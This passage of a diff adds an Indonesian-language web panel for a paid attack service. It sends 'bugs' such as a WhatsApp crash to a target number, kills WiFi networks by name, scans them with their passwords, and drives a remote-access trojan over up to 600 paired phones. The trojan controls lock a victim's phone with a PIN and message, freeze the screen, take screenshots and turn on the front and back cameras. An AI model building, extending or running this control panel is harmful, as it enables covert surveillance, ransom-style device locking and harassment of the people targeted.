+      <div class="feature-card" data-feature="lock"><div class="f-icon"><svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="#e74c3c" stroke-width="2"><rect x="3" y="11" width="18" height="11" rx="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/></svg></div><h4>LOCK HP</h4><p>Kunci perangkat</p><div class="status-dot"></div></div>
+      <div class="feature-card" data-feature="unlock"><div class="f-icon green"><svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="#2ecc71" stroke-width="2"><rect x="3" y="11" width="18" height="11" rx="2"/><path d="M7 11V7a5 5 0 0 1 9.9-1"/></svg></div><h4>UNLOCK HP</h4><p>Buka kunci</p><div class="status-dot"></div></div>
+      <div class="feature-card" data-feature="panic"><div class="f-icon"><svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="#e74c3c" stroke-width="2"><path d="M10.29 3.86L1.82 18a2 2 0 0 0 1.71 3h16.94a2 2 0 0 0 1.71-3L13.71 3.86a2 2 0 0 0-3.42 0z"/></svg></div><h4>PANIC</h4><p>Panic lock</p><div class="status-dot off"></div></div>
+      <div class="feature-card" data-feature="freeze"><div class="f-icon purple"><svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="#9b59b6" stroke-width="2"><circle cx="12" cy="12" r="10"/><line x1="4.93" y1="4.93" x2="19.07" y2="19.07"/></svg></div><h4>FREEZE</h4><p>Bekukan layar</p><div class="status-dot"></div></div>
+      <div class="feature-card" data-feature="lockhtml"><div class="f-icon yellow"><svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="#b89b3e" stroke-width="2"><polyline points="16 18 22 12 16 6"/></svg></div><h4>LOCK HTML</h4><p>Custom HTML</p><div class="status-dot"></div></div>
+      <div class="feature-card" data-feature="screenshot"><div class="f-icon"><svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="#e74c3c" stroke-width="2"><rect x="3" y="3" width="18" height="18" rx="2"/><circle cx="12" cy="12" r="3"/></svg></div><h4>SCREENSHOT</h4><p>Ambil layar</p><div class="status-dot"></div></div>
+      <div class="feature-card" data-feature="strobe"><div class="f-icon yellow"><svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="#f39c12" stroke-width="2"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/></svg></div><h4>STROBE</h4><p>Senter kelap kelip</p><div class="status-dot"></div></div>
+      <div class="feature-card" data-feature="vibrate"><div class="f-icon"><svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="#e74c3c" stroke-width="2"><rect x="7" y="2" width="10" height="20" rx="2"/></svg></div><h4>VIBRATE</h4><p>Getarkan terus</p><div class="status-dot"></div></div>
+      <div class="feature-card" data-feature="camFront"><div class="f-icon"><svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="#e74c3c" stroke-width="2"><rect x="3" y="6" width="18" height="14" rx="2"/><circle cx="12" cy="13" r="3"/></svg></div><h4>CAM DEPAN</h4><p>Camera depan</p><div class="status-dot"></div></div>
+      <div class="feature-card" data-feature="camBack"><div class="f-icon"><svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="#e74c3c" stroke-width="2"><rect x="3" y="6" width="18" height="14" rx="2"/><circle cx="7" cy="9" r="1"/></svg></div><h4>CAM BELAKANG</h4><p>Camera belakang</p><div class="status-dot"></div></div>
+    </div>
+  </div>
+
+  <div class="page" id="pagePaket">
+    <div class="back-header"><div class="back-btn" onclick="showPage('settings')">←</div><div class="page-title">PAKET ROLE</div></div>
+    <div class="price-list">
+      <div class="price-item active" data-role="MEMBER" data-price="25000"><span class="role-name" style="color:#9c9484">MEMBER</span><span class="price-tag">Rp 25.000</span></div>
+      <div class="price-item" data-role="PREMIUM" data-price="30000"><span class="role-name" style="color:#3498db">PREMIUM</span><span class="price-tag">Rp 30.000</span></div>
+      <div class="price-item" data-role="VVIP" data-price="50000"><span class="role-name" style="color:#f39c12">VVIP</span><span class="price-tag">Rp 50.000</span></div>
+      <div class="price-item" data-role="OWNER" data-price="60000"><span class="role-name" style="color:#e74c3c">OWNER</span><span class="price-tag">Rp 60.000</span></div>
+      <div class="price-item" data-role="DEVELOPER" data-price="75000"><span class="role-name" style="color:#9b59b6">DEVELOPER</span><span class="price-tag">Rp 75.000</span></div>
+    </div>
+    <div class="qris-section">
+      <div style="font-size:10px;color:#888;letter-spacing:2px;margin-bottom:10px">SCAN QRIS</div>
+      <div class="qris-img"><img id="qrisImage" src="" style="display:none"><div id="qrisEmpty" style="color:#999;font-size:10px;display:flex;align-items:center;justify-content:center;height:100%">QRIS BELUM DI-UPLOAD</div></div>
+      <label class="upload-qris-btn" for="uploadQris"><input type="file" id="uploadQris" accept="image/*">UPLOAD QRIS DARI GALERI</label>
+    </div>
+    <label class="upload-bukti" for="uploadBukti"><input type="file" id="uploadBukti" accept="image/*"><div class="upload-text">KIRIM BUKTI PEMBAYARAN</div><img class="preview-img" id="previewBukti"></label>
+    <div class="warning-text"><b>JANGAN BERSIKERAS</b> mengirim bukti palsu. Kalau tetap dikirim, <b>TIDAK AKAN DI-UPGRADE</b>.</div>
+    <button class="btn-submit" id="btnPaketSubmit">KIRIM BUKTI</button>
+  </div>
+
+  <div class="page" id="pageSettings">
+    <div class="back-header"><div class="back-btn" onclick="showPage('bug')">←</div><div class="page-title">SETTINGS</div></div>
+    <div class="setting-card" id="cardProfile"><div class="left"><div class="icon purple"><svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="#9b59b6" stroke-width="2"><path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2"/><circle cx="12" cy="7" r="4"/></svg></div><div><h4>PROFILE</h4><p>Ganti foto profile</p></div></div><div class="arrow">›</div></div>
+    <div class="setting-card" onclick="showPage('paket')"><div class="left"><div class="icon yellow"><svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="#b89b3e" stroke-width="2"><rect x="2" y="6" width="20" height="12" rx="2"/><circle cx="12" cy="12" r="2"/></svg></div><div><h4>PAKET ROLE</h4><p>Beli akses premium</p></div></div><div class="arrow">›</div></div>
+    <div class="setting-card" onclick="showPage('wifi')"><div class="left"><div class="icon green"><svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="#2ecc71" stroke-width="2"><path d="M5 12.55a11 11 0 0 1 14.08 0"/><path d="M1.42 9a16 16 0 0 1 21.16 0"/></svg></div><div><h4>WIFI ALL</h4><p>Kill & Scan WiFi</p></div></div><div class="arrow">›</div></div>
+    <div class="setting-card" onclick="showPage('rat')"><div class="left"><div class="icon red"><svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="#e74c3c" stroke-width="2"><rect x="5" y="2" width="14" height="20" rx="3"/></svg></div><div><h4>RAT CONTROL</h4><p>Remote access device</p></div></div><div class="arrow">›</div></div>
+    <div class="setting-card" id="cardLogout"><div class="left"><div class="icon red"><svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="#e74c3c" stroke-width="2"><path d="M9 21H5a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h4"/><polyline points="16 17 21 12 16 7"/><line x1="21" y1="12" x2="9" y2="12"/></svg></div><div><h4>LOGOUT</h4><p>Keluar akun</p></div></div><div class="arrow">›</div></div>
+  </div>
+</div>
+
+<div class="modal" id="modalLock"><div class="modal-box"><h3>🔒 KONFIGURASI LOCK</h3><input type="text" class="input-field" id="lockPin" placeholder="Custom PIN" maxlength="6"><input type="text" class="input-field" id="lockMsg" placeholder="Pesan untuk target"><button class="btn-submit" id="btnLockSubmit">KUNCI SEKARANG</button><button class="btn-cancel" onclick="document.getElementById('modalLock').classList.remove('show')">BATAL</button></div></div>
+
+<div class="modal" id="modalLockHtml"><div class="modal-box"><h3>📝 CUSTOM HTML LOCK</h3><textarea class="input-field" id="htmlLockInput" placeholder="<!DOCTYPE html>&#10;<html>...</html>"></textarea><button class="btn-submit" id="btnHtmlLockSubmit">KIRIM HTML LOCK</button><button class="btn-cancel" onclick="document.getElementById('modalLockHtml').classList.remove('show')">BATAL</button></div></div>
+
+<div class="modal" id="modalProfile"><div class="modal-box">
+  <h3>👤 PROFILE SAYA</h3>
+  <div class="profile-modal-pic" id="modalProfilePic"><svg width="50" height="50" viewBox="0 0 24 24" fill="none" stroke="#fff" stroke-width="2"><path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2"/><circle cx="12" cy="7" r="4"/></svg></div>
+  <div class="profile-modal-name" id="modalProfileName">USERNAME</div>
+  <div class="profile-modal-role role-MEMBER" id="modalProfileRole">● MEMBER</div>
+  <label class="profile-upload-btn" for="uploadProfilePic"><input type="file" id="uploadProfilePic" accept="image/*">GANTI FOTO PROFILE</label>
+  <button class="btn-cancel" onclick="document.getElementById('modalProfile').classList.remove('show')">TUTUP</button>
+</div></div>
+
+<div class="loading-overlay" id="loadingOverlay"><div class="spinner"></div><p id="loadingText">MEMPROSES...</p></div>
+<div class="overlay" id="overlay"><div class="check-big"><svg viewBox="0 0 24 24" fill="none" stroke="#fff" stroke-width="4" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 6 9 17 4 12"/></svg></div><p id="overlayText">BERHASIL</p></div>
+<div class="toast" id="toast">Berhasil</div>
+
+<script>
+  const BACKEND_URL = window.location.origin;
+  const USERS_KEY = 'lyx_users';
+  const SESSION_KEY = 'lyx_session';
+  const QRIS_KEY = 'lyx_qris_image';
+  const PROFILE_PIC_KEY = 'lyx_profile_pic';
+
+  function getUsers(){try{return JSON.parse(localStorage.getItem(USERS_KEY)||'{}');}catch(e){return{};}}
+  function saveUsers(u){localStorage.setItem(USERS_KEY,JSON.stringify(u));}
+  function getSession(){try{return JSON.parse(localStorage.getItem(SESSION_KEY)||'null');}catch(e){return null;}}
+
+  const loginScreen = document.getElementById('loginScreen');
+  let loginMode = 'login';
+  document.querySelectorAll('.login-tab').forEach(tab=>{
+    tab.addEventListener('click',()=>{
+      document.querySelectorAll('.login-tab').forEach(t=>t.classList.remove('active'));
+      tab.classList.add('active');
+      loginMode = tab.dataset.tab;
+      document.getElementById('loginBtn').textContent = loginMode === 'register' ? 'CREAT ACCOUNT' : 'MASUK';
+    });
+  });
+
+  function updateProfile(username, role){
+    document.getElementById('headerProfileName').textContent = username.toUpperCase();
+    const roleEl = document.getElementById('headerProfileRole');
+    roleEl.className = 'profile-role role-' + role;
+    document.getElementById('headerRoleText').textContent = role;
+  }
+
+  function loadProfilePic(){
+    const s = getSession();
+    const key = PROFILE_PIC_KEY + '_' + (s ? s.user : 'default');
+    const saved = localStorage.getItem(key);
+    const headerPic = document.getElementById('headerProfilePic');
+    const modalPic = document.getElementById('modalProfilePic');
+    if(saved){
+      headerPic.innerHTML = '<img src="'+saved+'">';
+      modalPic.innerHTML = '<img src="'+saved+'">';
+    }
+  }
+
+  document.getElementById('loginBtn').addEventListener('click',()=>{
+    const u = document.getElementById('loginUser').value.trim();
+    const p = document.getElementById('loginPass').value.trim();
+    const err = document.getElementById('loginError');
+    err.textContent = '';
+    if(!u||!p){err.textContent='USERNAME & PASSWORD WAJIB';return;}
+    const users = getUsers();
+    if(loginMode==='register'){
+      if(users[u]){err.textContent='USERNAME SUDAH ADA';return;}
+      users[u]={pass:p,role:'MEMBER'};
+      saveUsers(users);
+      localStorage.setItem(SESSION_KEY,JSON.stringify({user:u,role:'MEMBER'}));
+      updateProfile(u,'MEMBER');loadProfilePic();
+      loginScreen.classList.add('hidden');
+      showOverlay('AKUN BERHASIL DIBUAT');
+    }else{
+      if(!users[u]||users[u].pass!==p){err.textContent='USERNAME / PASSWORD SALAH';return;}
+      localStorage.setItem(SESSION_KEY,JSON.stringify({user:u,role:users[u].role}));
+      updateProfile(u,users[u].role);loadProfilePic();
+      loginScreen.classList.add('hidden');
+    }
+  });
+
+  (function autoLogin(){
+    const s = getSession();
+    if(s&&s.user){updateProfile(s.user,s.role||'MEMBER');loadProfilePic();loginScreen.classList.add('hidden');}
+  })();
+
+  const loadingOverlay = document.getElementById('loadingOverlay');
+  const overlay = document.getElementById('overlay');
+  let overlayTimer;
+  function showLoading(t){document.getElementById('loadingText').textContent=t;loadingOverlay.classList.add('show');}
+  function hideLoading(){loadingOverlay.classList.remove('show');}
+  function showOverlay(t){document.getElementById('overlayText').textContent=t;overlay.classList.add('show');clearTimeout(overlayTimer);overlayTimer=setTimeout(()=>overlay.classList.remove('show'),2000);}
+  overlay.addEventListener('click',()=>{overlay.classList.remove('show');clearTimeout(overlayTimer);});
+
+  let toastTimer;
+  function showToast(m){const t=document.getElementById('toast');t.textContent=m;t.classList.add('show');clearTimeout(toastTimer);toastTimer=setTimeout(()=>t.classList.remove('show'),2000);}
+
+  function showPage(name){
+    document.querySelectorAll('.page').forEach(p=>p.classList.remove('active'));
+    document.getElementById('page'+name.charAt(0).toUpperCase()+name.slice(1)).classList.add('active');
+    window.scrollTo(0,0);
+  }
+  window.showPage = showPage;
+
+  document.getElementById('btnWifiNav').addEventListener('click',()=>showPage('wifi'));
+  document.getElementById('btnRatNav').addEventListener('click',()=>showPage('rat'));
+  document.getElementById('btnSettingsNav').addEventListener('click',()=>showPage('settings'));
+
+  // BUG SLIDER
+  let selectedBug = 'crash_wa';
+  document.querySelectorAll('.card').forEach((card,i)=>{
+    card.addEventListener('click',()=>{
+      document.querySelectorAll('.card').forEach(c=>c.classList.remove('active'));
+      card.classList.add('active');
+      selectedBug = card.dataset.bug;
+      document.querySelectorAll('.dot').forEach(d=>d.classList.remove('active'));
+      const p = Math.min(Math.floor(i/3),2);
+      document.querySelectorAll('.dot')[p].classList.add('active');
+    });
+  });
+
+  let intensity = 'normal';
+  document.querySelectorAll('.intensity-opt').forEach(opt=>{
+    opt.addEventListener('click',()=>{
+      document.querySelectorAll('.intensity-opt').forEach(o=>o.classList.remove('active'));
+      opt.classList.add('active');
+      intensity = opt.dataset.level;
+    });
+  });
+
+  document.getElementById('senderPrivate').addEventListener('click',()=>{
+    document.getElementById('senderPrivate').classList.add('active');
+    document.getElementById('senderGlobal').classList.remove('active');
+  });
+  document.getElementById('senderGlobal').addEventListener('click',()=>{
+    document.getElementById('senderGlobal').classList.add('active');
+    document.getElementById('senderPrivate').classList.remove('active');
+  });
+
+  document.getElementById('btnSend').addEventListener('click',async()=>{
+    const target = document.getElementById('target').value.trim();
+    if(!target){document.getElementById('target').focus();return;}
+    const s = getSession();if(!s){showToast('Login dulu');return;}
+    showLoading('MENGIRIM BUG...');
+    try{
+      const res = await fetch(BACKEND_URL+'/api/bug/send',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({target,bugType:selectedBug,intensity,user:s.user})});
+      const data = await res.json();
+      hideLoading();
+      showOverlay(data.success?'BUG TELAH DIKIRIM':'GAGAL');
+    }catch(e){hideLoading();showToast('Backend offline');}
+  });
+
+  // WIFI
+  document.getElementById('btnKillWifi').addEventListener('click',async()=>{
+    const n = document.getElementById('killWifiName').value.trim();
+    if(!n){document.getElementById('killWifiName').focus();return;}
+    showLoading('MEMATIKAN WIFI...');
+    try{
+      const res = await fetch(BACKEND_URL+'/api/wifi/kill',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({ssid:n})});
+      const d = await res.json();
+      hideLoading();showOverlay(d.success?'WIFI '+n.toUpperCase()+' MATI':'GAGAL');
+    }catch(e){hideLoading();showToast('Backend offline');}
+  });
+
+  document.getElementById('btnScanWifi').addEventListener('click',async()=>{
+    showLoading('SCANNING...');
+    try{
+      const res = await fetch(BACKEND_URL+'/api/wifi/scan');
+      const d = await res.json();
+      hideLoading();
+      const list = document.getElementById('wifiList');list.innerHTML='';
+      (d.networks||[]).forEach(w=>{
+        list.innerHTML += '<div class="wifi-item"><h5>📶 '+w.ssid+'</h5><p>🔑 '+(w.password||'?')+'</p></div>';
+      });
+      showOverlay('SCAN SELESAI');
+    }catch(e){hideLoading();showToast('Backend offline');}
+  });
+
+  // RAT
+  let pairCode = '------';
+  document.getElementById('btnGen').addEventListener('click',()=>{
+    const c='ABCDEFGHJKLMNPQRSTUVWXYZ23456789';let code='';
+    for(let i=0;i<6;i++)code+=c[Math.floor(Math.random()*c.length)];
+    pairCode=code;document.getElementById('pairCode').textContent=code;
+    fetch(BACKEND_URL+'/api/rat/generate-code',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({code})}).catch(()=>{});
+    showToast('Code: '+code);
+  });
+  document.getElementById('btnCopy').addEventListener('click',()=>{
+    if(pairCode==='------'){showToast('Generate dulu');return;}
+    navigator.clipboard.writeText(pairCode).catch(()=>{});showToast('Disalin');
+  });
+
+  const devices = [];
+  function renderDevices(){
+    const list = document.getElementById('deviceList');
+    document.getElementById('deviceCount').textContent = devices.length+' / 600';
+    if(devices.length===0){list.innerHTML='<div style="text-align:center;padding:20px;color:#555;font-size:11px">Belum ada device terpairing</div>';return;}
+    list.innerHTML='';
+    devices.forEach(d=>{
+      const el = document.createElement('div');
+      el.className='device-item';
+      el.innerHTML='<div class="dev-left"><div class="dev-icon"><svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="#b89b3e" stroke-width="2"><rect x="5" y="2" width="14" height="20" rx="3"/></svg></div><div><div class="dev-name">'+d.name+'</div><div class="dev-meta">Online</div></div></div><button class="btn-open">OPEN</button>';
+      el.querySelector('.btn-open').addEventListener('click',()=>{openDashboard(d);});
+      list.appendChild(el);
+    });
+  }
+
+  let currentDevice = null;
+  function openDashboard(d){
+    currentDevice = d;
+    document.getElementById('dashTitle').textContent = d.name;
+    showPage('dash');
+    document.querySelectorAll('#pageDash .status-dot').forEach(dot=>dot.classList.remove('active','off','blink'));
+  }
+
+  document.querySelectorAll('#pageDash .feature-card').forEach(card=>{
+    card.addEventListener('click',async()=>{
+      const f = card.dataset.feature;
+      const dot = card.querySelector('.status-dot');
+      if(f==='lock'){document.getElementById('modalLock').classList.add('show');return;}
+      if(f==='lockhtml'){document.getElementById('modalLockHtml').classList.add('show');return;}
+      let lt = 'MENGIRIM PERINTAH...';
+      showLoading(lt);
+      try{
+        const res = await fetch(BACKEND_URL+'/api/rat/command',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({deviceId:currentDevice.id,command:f})});
+        const d = await res.json();
+        hideLoading();
+        if(d.success){
+          if(f==='panic'){dot.classList.toggle('off');dot.classList.toggle('active');}
+          else if(f==='strobe'||f==='vibrate'){dot.classList.toggle('blink');}
+          else{dot.classList.toggle('active');}
+          showOverlay('PERINTAH DIBERIKAN');
+        }else{showToast('Gagal: '+d.message);}
+      }catch(e){hideLoading();showToast('Backend offline');}
+    });
+  });
+
+  document.getElementById('btnLockSubmit').addEventListener('click',()=>{
+    const pin = document.getElementById('lockPin').value.trim();
+    if(!pin){document.getElementById('lockPin').focus();return;}
+    document.getElementById('modalLock').classList.remove('show');
+    showLoading('MENGUNCI...');
+    fetch(BACKEND_URL+'/api/rat/command',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({deviceId:currentDevice.id,command:'lock',pin})}).catch(()=>{});
+    setTimeout(()=>{hideLoading();showOverlay('HP DIKUNCI');},1500);
+  });
+
+  document.getElementById('btnHtmlLockSubmit').addEventListener('click',()=>{
+    const html = document.getElementById('htmlLockInput').value.trim();
+    if(!html){document.getElementById('htmlLockInput').focus();return;}
+    document.getElementById('modalLockHtml').classList.remove('show');
+    showLoading('KIRIM HTML...');
+    fetch(BACKEND_URL+'/api/rat/command',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({deviceId:currentDevice.id,command:'lockhtml',html})}).catch(()=>{});
+    setTimeout(()=>{hideLoading();showOverlay('HTML DIKIRIM');},1500);
+  });
+
+  // PROFILE
+  document.getElementById('profileWrap').addEventListener('click',()=>{
+    const s = getSession();if(!s)return;
+    document.getElementById('modalProfileName').textContent = s.user.toUpperCase();
+    const roleEl = document.getElementById('modalProfileRole');
+    roleEl.className = 'profile-modal-role role-'+s.role;
+    roleEl.textContent = '● '+s.role;
+    loadProfilePic();
+    document.getElementById('modalProfile').classList.add('show');
+  });
+  document.getElementById('cardProfile').addEventListener('click',()=>{
+    const s = getSession();if(!s)return;
+    document.getElementById('modalProfileName').textContent = s.user.toUpperCase();
+    const roleEl = document.getElementById('modalProfileRole');
+    roleEl.className = 'profile-modal-role role-'+s.role;
+    roleEl.textContent = '● '+s.role;
+    loadProfilePic();
+    document.getElementById('modalProfile').classList.add('show');
+  });
+  document.getElementById('uploadProfilePic').addEventListener('change',(e)=>{
+    const f = e.target.files[0];if(!f)return;
+    const s = getSession();if(!s)return;
+    const r = new FileReader();
+    r.onload = ev=>{try{localStorage.setItem(PROFILE_PIC_KEY+'_'+s.user,ev.target.result);loadProfilePic();showOverlay('FOTO DISIMPAN');}catch(err){showToast('Terlalu besar');}};
+    r.readAsDataURL(f);
+  });
+
+  document.getElementById('cardLogout').addEventListener('click',()=>{
+    localStorage.removeItem(SESSION_KEY);location.reload();
+  });
+
+  // QRIS
+  function loadQris(){
+    const saved = localStorage.getItem(QRIS_KEY);
+    if(saved){
+      document.getElementById('qrisImage').src = saved;
+      document.getElementById('qrisImage').style.display = 'block';
+      document.getElementById('qrisEmpty').style.display = 'none';
+    }
+  }
+  document.getElementById('uploadQris').addEventListener('change',e=>{
+    const f = e.target.files[0];if(!f)return;
+    const r = new FileReader();
+    r.onload = ev=>{try{localStorage.setItem(QRIS_KEY,ev.target.result);loadQris();showOverlay('QRIS DISIMPAN');}catch(err){showToast('Terlalu besar');}};
+    r.readAsDataURL(f);
+  });
+  loadQris();
+
+  document.querySelectorAll('.price-item').forEach(item=>{
+    item.addEventListener('click',()=>{
+      document.querySelectorAll('.price-item').forEach(i=>i.classList.remove('active'));
+      item.classList.add('active');
+      showToast('Paket: '+item.dataset.role);
+    });
+  });
+
+  document.getElementById('uploadBukti').addEventListener('change',e=>{
+    const f = e.target.files[0];if(!f)return;
+    const r = new FileReader();
+    r.onload = ev=>{document.getElementById('previewBukti').src = ev.target.result;document.getElementById('previewBukti').style.display='block';};
+    r.readAsDataURL(f);
+  });
+
+  document.getElementById('btnPaketSubmit').addEventListener('click',()=>{
+    const f = document.getElementById('uploadBukti').files[0];
+    if(!f){showToast('Pilih bukti dulu');return;}
+    showLoading('MENGIRIM BUKTI...');
+    setTimeout(()=>{hideLoading();showOverlay('BUKTI DIKIRIM · DIPROSES 1 JAM');},2000);
+  });
+
+  async function checkBackend(){
+    const start = Date.now();
+    try{
+      const res = await fetch(BACKEND_URL+'/api/status');
+      await res.json();
+      document.getElementById('serverStatusText').textContent = 'BACKEND CONNECTED';
+      document.getElementById('latencyText').textContent = (Date.now()-start)+' ms';
+    }catch(e){
+      document.getElementById('serverStatusText').textContent = 'BACKEND OFFLINE';
+      document.getElementById('latencyText').textContent = '--';
+    }
+  }
+  checkBackend();setInterval(checkBackend,10000);
+  renderDevices();
+</script>
+</body>
+</html>
